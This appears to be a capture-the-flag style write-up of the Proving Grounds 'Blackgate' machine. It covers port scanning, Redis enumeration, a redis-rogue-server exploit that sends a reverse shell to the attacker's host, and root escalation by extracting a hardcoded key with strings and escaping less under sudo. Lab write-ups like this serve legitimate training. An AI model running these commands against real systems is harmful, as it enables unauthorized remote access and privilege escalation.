---
title: Blackgate 
date: 2022-10-19 12:00:00
categories: [OSCP,PG]
tags: [pg]
---

# BlackGate 

## Enumeration

### Autorecon

```bash
sudo env "PATH=$PATH" autorecon -v 192.168.160.176
```

```bash
[*] Scanning target 192.168.160.176
[*] [192.168.160.176/all-tcp-ports] Discovered open port tcp/22 on 192.168.160.176
[*] [192.168.160.176/all-tcp-ports] Discovered open port tcp/6379 on 192.168.160.176
[*] Identified service ssh on tcp/22 on 192.168.160.176
[*] Identified service redis on tcp/6379 on 192.168.160.176
[*] Finished scanning all targets in 3 minutes, 52 seconds!
```

### Redis
```bash
redis-cli -h 192.168.160.176
> info
redis_version:4.0.14
```

## Foothold

### Exploiting Redis

[Hacktricks - Redis RCE](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce)

Exploit: [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
./redis-rogue-server.py --rhost=192.168.160.176 --lhost=192.168.49.160 --lport=4242
```
```bash
[info] TARGET 192.168.160.176:6379
[info] SERVER 192.168.49.160:4242
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 192.168.49.160
Reverse server port: 4242
[info] Reverse shell payload sent.
[info] Check at 192.168.49.160:4242
[info] Unload module...
```

## Privelege Escalation

It seems we have the permissions to run **/usr/local/bin/redis-status** as root user

`sudo -l`
```bash
User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

Let's check what it does
`sudo /usr/local/bin/redis-status`
```bash
[*] Redis Uptime
Authorization Key: 123
Wrong Authorization Key!
Incident has been reported!
```

Running strings on the binary reveals the authorization key
`strings /usr/local/bin/redis-status`
```bash
...
[]A\A]A^A_
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
...
```

Running the binary using `ClimbingParrotKickingDonkey321` as Auth Key will display the systemctl status output of "redis.service" in less

We just escape less as root using - [gtfobins - less](https://gtfobins.github.io/gtfobins/less/#sudo)